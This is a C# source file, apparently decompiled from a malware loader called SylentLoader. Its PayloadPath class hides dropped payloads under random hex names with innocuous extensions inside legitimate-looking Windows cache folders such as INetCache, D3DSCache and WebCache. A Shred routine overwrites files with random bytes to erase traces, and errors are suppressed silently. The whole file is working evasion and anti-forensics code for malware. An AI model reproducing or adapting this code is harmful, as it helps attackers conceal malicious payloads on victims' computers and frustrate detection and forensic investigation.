using System;
using System.IO;
using System.Security.Cryptography;

namespace SylentLoader.Services.Security;

internal static class PayloadPath
{
	private static readonly RandomNumberGenerator Rng = RandomNumberGenerator.Create();

	private static readonly string[] Extensions = new string[4] { "tmp", "dat", "bin", "cache" };

	public static string NextStealthPath()
	{
		string path = PickHostDirectory();
		string path2 = string.Concat(str2: Extensions[NextByte() % Extensions.Length], str0: RandHex(8), str1: ".");
		return Path.Combine(path, path2);
	}

	private static string PickHostDirectory()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		string[] array = new string[4]
		{
			Path.Combine(folderPath, "Microsoft", "Windows", "INetCache", "IE"),
			Path.Combine(folderPath, "D3DSCache"),
			Path.Combine(folderPath, "Microsoft", "Windows", "Explorer"),
			Path.Combine(folderPath, "Microsoft", "Windows", "WebCache")
		};
		foreach (string text in array)
		{
			if (IsWriteableDir(text))
			{
				return text;
			}
		}
		try
		{
			string text2 = Path.Combine(folderPath, "Microsoft", "Windows", "Caches");
			Directory.CreateDirectory(text2);
			if (IsWriteableDir(text2))
			{
				return text2;
			}
		}
		catch
		{
		}
		return Path.GetTempPath();
	}

	private static bool IsWriteableDir(string path)
	{
		try
		{
			if (!Directory.Exists(path))
			{
				return false;
			}
			using (new FileStream(Path.Combine(path, "." + RandHex(6) + ".tmp"), FileMode.CreateNew, FileAccess.Write, FileShare.None, 1, FileOptions.DeleteOnClose))
			{
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static void Shred(string path)
	{
		try
		{
			if (!File.Exists(path))
			{
				return;
			}
			long length = new FileInfo(path).Length;
			if (length <= 0)
			{
				return;
			}
			using FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Write, FileShare.None);
			byte[] array = new byte[Math.Min(65536L, length)];
			long num = length;
			while (num > 0)
			{
				int num2 = (int)Math.Min(array.Length, num);
				Rng.GetBytes(array, 0, num2);
				fileStream.Write(array, 0, num2);
				num -= num2;
			}
			fileStream.Flush(flushToDisk: true);
		}
		catch
		{
		}
	}

	private static string RandHex(int chars)
	{
		byte[] array = new byte[(chars + 1) / 2];
		Rng.GetBytes(array);
		return Convert.ToHexString(array).ToLowerInvariant().Substring(0, chars);
	}

	private static byte NextByte()
	{
		Span<byte> data = stackalloc byte[1];
		Rng.GetBytes(data);
		return data[0];
	}
}
